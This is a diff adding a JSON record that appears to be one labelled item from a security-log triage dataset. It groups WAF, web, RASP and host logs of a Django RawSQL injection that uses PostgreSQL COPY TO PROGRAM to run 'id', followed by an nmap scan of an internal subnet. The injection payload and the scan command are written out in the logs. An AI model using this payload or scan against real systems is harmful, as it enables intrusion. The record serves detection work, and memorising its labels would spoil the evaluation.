@@ -1,0 +1,57 @@
+{
+ "unit": 1078,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Django RawSQL 注入 PostgreSQL COPY TO PROGRAM 命令执行",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-16 09:31:38",
+   "source": "waf",
+   "log_id": "WAF0306586",
+   "content": "/api/v1/reports/export filter=1);COPY (SELECT '') TO PROGRAM 'id';-- Mozilla/5.0 (Linux; Android 14; Pixel 8) ",
+   "event_id": "1078-WAF0306586"
+  },
+  {
+   "timestamp": "2026-06-16 09:31:40",
+   "source": "web",
+   "log_id": "WEB0308581",
+   "content": "/api/v1/reports/export filter=1);COPY (SELECT '') TO PROGRAM 'id';-- Mozilla/5.0 (Linux; Android 14; Pixel 8) ",
+   "event_id": "1078-WEB0308581"
+  },
+  {
+   "timestamp": "2026-06-16 09:31:41",
+   "source": "rasp",
+   "log_id": "RASP0339201",
+   "content": "https://app-django-84.ops-corp.com/api/v1/reports/export {\"sqli\": \"COPY TO PROGRAM\", \"orm\": \"RawSQL\"} Mozilla/",
+   "event_id": "1078-RASP0339201"
+  },
+  {
+   "timestamp": "2026-06-16 09:33:10",
+   "source": "hids",
+   "log_id": "HID0332253",
+   "content": "id /bin/id id <== /bin/bash -c 'id' <== /opt/app/venv/bin/python manage.py runserver",
+   "event_id": "1078-HID0332253"
+  },
+  {
+   "timestamp": "2026-06-16 09:34:40",
+   "source": "hids",
+   "log_id": "HID0332261",
+   "content": "nmap -sT -Pn -p 22,445,3389 --open 10.20.6.0/24 nmap nmap -sT -Pn -p 22,445,3389 --open 10.20.6.0/24 <== /usr/",
+   "event_id": "1078-HID0332261"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
